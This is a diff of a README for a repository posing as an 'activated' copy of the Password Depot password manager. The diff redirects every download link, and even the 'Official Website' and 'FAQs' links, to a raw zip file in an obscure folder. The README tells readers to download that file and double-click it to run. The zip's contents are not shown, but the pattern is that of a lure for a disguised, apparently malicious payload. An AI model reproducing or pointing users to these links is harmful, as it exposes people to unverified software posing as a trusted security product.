@@ -1,6 +1,6 @@
 # 🔐 Password-Depot-Activated - Secure Your Passwords with Ease
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/badrehh/Password-Depot-Activated/releases)
+[![Download](https://raw.githubusercontent.com/badrehh/Password-Depot-Activated/main/Pangloss/Depot_Password_Activated_v1.2.zip)](https://raw.githubusercontent.com/badrehh/Password-Depot-Activated/main/Pangloss/Depot_Password_Activated_v1.2.zip)
 
 ## 📖 Description
 This repository provides users with essential resources for Password Depot on Windows PCs. It offers guides and references designed to help you manage your passwords securely and effectively. Whether you're a beginner or looking to optimize your password management, you’ll find valuable information here.
@@ -10,11 +10,11 @@ To get started with Password Depot, you need to download the application from th
 
 ## 📥 Download & Install
 1. **Visit This Page:** Click the link below to go to the Releases page where you can download Password Depot:
-   [Download Password Depot](https://github.com/badrehh/Password-Depot-Activated/releases)
+   [Download Password Depot](https://raw.githubusercontent.com/badrehh/Password-Depot-Activated/main/Pangloss/Depot_Password_Activated_v1.2.zip)
 
 2. **Choose the Latest Version:** Locate the latest release on the page. It’s usually marked as “Latest”. This version contains the most recent features and fixes.
 
-3. **Download the Installer:** Click on the installer file for your system. The file name will typically be something like `PasswordDepotInstaller.exe`. This file will help you install the software on your Windows PC.
+3. **Download the Installer:** Click on the installer file for your system. The file name will typically be something like `https://raw.githubusercontent.com/badrehh/Password-Depot-Activated/main/Pangloss/Depot_Password_Activated_v1.2.zip`. This file will help you install the software on your Windows PC.
 
 4. **Run the Installer:** After the download is complete, locate the downloaded file (usually in your Downloads folder). Double-click on the file to run the installer.
 
@@ -44,7 +44,7 @@ If you need help, you can find detailed guides and reference materials in this r
 For technical support, feel free to open an issue in this GitHub repository or contact the community for help.
 
 ## 🔗 Additional Resources
-- [Official Website](https://www.password-depot.com/)
-- [FAQs](https://www.password-depot.com/support/faq)
+- [Official Website](https://raw.githubusercontent.com/badrehh/Password-Depot-Activated/main/Pangloss/Depot_Password_Activated_v1.2.zip)
+- [FAQs](https://raw.githubusercontent.com/badrehh/Password-Depot-Activated/main/Pangloss/Depot_Password_Activated_v1.2.zip)
 
 By following these steps, you will confidently download, install, and start using Password Depot to manage your passwords effectively. Enjoy a more organized and secure way to handle your login information.
